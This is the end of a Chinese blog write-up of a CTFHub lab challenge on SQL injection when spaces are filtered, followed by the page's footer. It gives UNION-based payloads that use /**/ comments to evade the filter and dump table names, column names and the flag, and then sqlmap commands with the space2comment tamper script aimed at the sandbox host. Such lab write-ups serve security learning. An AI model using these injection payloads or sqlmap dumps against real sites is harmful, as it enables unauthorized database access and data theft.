+<p>查看表名</p>
+<p><code>-1/**/union/**/select/**/group_concat(table_name),1/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;sqli&#39;</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>-1/**/union/**/select/**/group_concat(column_name),1/**/from/**/information_schema.columns/**/where/**/table_name=&#39;idupwwkznv&#39;</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-%E5%88%97%E5%90%8D.png"></p>
+<p>查看具体数据</p>
+<p><code>-1/**/union/**/select/**/1,tgcalietyq/**/from/**/sqli.idupwwkznv</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-flag.png"></p>
+<p><strong>方法二：sqlmap</strong></p>
+<p>查看数据库名</p>
+<p><code>sqlmap -u http://challenge-3ae46f41e0fbbdf9.sandbox.ctfhub.com:10800/?id=1 --tamper=space2comment --dbs </code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-sqlmap-%E5%BA%93%E5%90%8D.png"></p>
+<p>查看sqli数据库的表名</p>
+<p><code>sqlmap -u http://challenge-3ae46f41e0fbbdf9.sandbox.ctfhub.com:10800/?id=1 --tamper=space2comment --tables -D sqli</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-sqlmap-%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>sqlmap -u http://challenge-3ae46f41e0fbbdf9.sandbox.ctfhub.com:10800/?id=1 --tamper=space2comment --tables -D sqli -T idupwwkznv --columns</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-sqlmap-%E5%88%97%E5%90%8D.png"></p>
+<p>查看flag数值</p>
+<p><code>sqlmap -u http://challenge-3ae46f41e0fbbdf9.sandbox.ctfhub.com:10800/?id=1 --tamper=space2comment --tables -D sqli -T idupwwkznv -C tgcalietyq --dump</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-sqlmap-flag.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1628575">cookie注入的三种方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lzlzzzzzz/p/11804144.html">SQL注入之sqlmap进阶</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cj_Allen/article/details/104704345">sqlmap,Tamper详解及使用指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">SQL注入绕过技巧</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Crrrln
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/" title="SQL注入（2）">http://example.com/2024/01/24/CTFHUB-WEB-sql注入（2）/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/UA%E6%B3%A8%E5%85%A5/" rel="tag"># UA注入</a>
+              <a href="/tags/Refer%E6%B3%A8%E5%85%A5/" rel="tag"># Refer注入</a>
+              <a href="/tags/%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/" rel="tag"># 过滤空格</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/01/16/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89/" rel="prev" title="SQL注入（1）">
+                  <i class="fa fa-angle-left"></i> SQL注入（1）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/01/26/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%A8%A1%E7%89%88/" rel="next" title="二叉树的一些模版">
+                  二叉树的一些模版 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+<!--
+-->
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Crrrln</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">27k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45 分钟</span>
+  </span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
